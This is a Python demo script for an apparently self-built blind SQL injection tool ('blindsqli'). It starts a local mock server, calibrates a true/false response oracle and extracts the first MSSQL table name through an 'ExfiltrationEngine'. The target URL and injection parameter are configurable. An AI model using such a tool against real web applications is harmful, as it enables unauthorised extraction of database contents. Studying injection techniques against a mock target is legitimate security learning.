"""Self-contained demonstration.

Starts the bundled local mock target, then:
  1. calibrates and prints how TRUE vs FALSE responses differ;
  2. shows one boolean-TRUE and one boolean-FALSE oracle result;
  3. extracts the first table name end to end.

Run:  python examples/demo.py
Requires: requests  (pip install -r requirements.txt)
"""

from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from blindsqli.config import Config
from blindsqli.dialect import get_dialect
from blindsqli.engine import ExfiltrationEngine
from blindsqli.oracle import BooleanOracle
from blindsqli.reporting import TerminalReporter
from blindsqli.targets import first_table_name
from mock_target import MockTarget


def main() -> None:
    with MockTarget(secret="jun_users", param="q", port=0) as srv:
        print(f"[*] mock target running at {srv.url}\n")
        cfg = Config(target_url=srv.url, injection_param="q", workers=8, verbosity=1)

        # 1) calibrate -- inspect the true/false side channel
        oracle = BooleanOracle(cfg)
        oracle.calibrate()
        clf = oracle.classifier
        print("[*] calibrated fingerprints:")
        print(f"    TRUE  -> HTTP {clf.ok.status}, {clf.ok.length} bytes")       # type: ignore[attr-defined]
        print(f"    FALSE -> HTTP {clf.error.status}, {clf.error.length} bytes\n")  # type: ignore[attr-defined]

        # 2) demonstrate boolean TRUE / FALSE detection
        target = first_table_name(get_dialect("mssql"))
        print("[*] boolean detection:")
        print(f"    (TABLE_NAME) LIKE 'jun%'  -> {oracle.test(target.starts_with('jun')).value}")
        print(f"    (TABLE_NAME) LIKE 'xyz%'  -> {oracle.test(target.starts_with('xyz')).value}\n")

        # 3) full extraction of the first table name
        print("[*] extracting first table name:\n")
        engine = ExfiltrationEngine(cfg, oracle, reporter=TerminalReporter(verbosity=1))
        result = engine.extract(target)
        print(f"\n[+] recovered: {result.value!r}")
        print(f"[+] complete={result.complete} length={result.length} "
              f"requests={result.requests_completed} failed={result.requests_failed}")


if __name__ == "__main__":
    main()
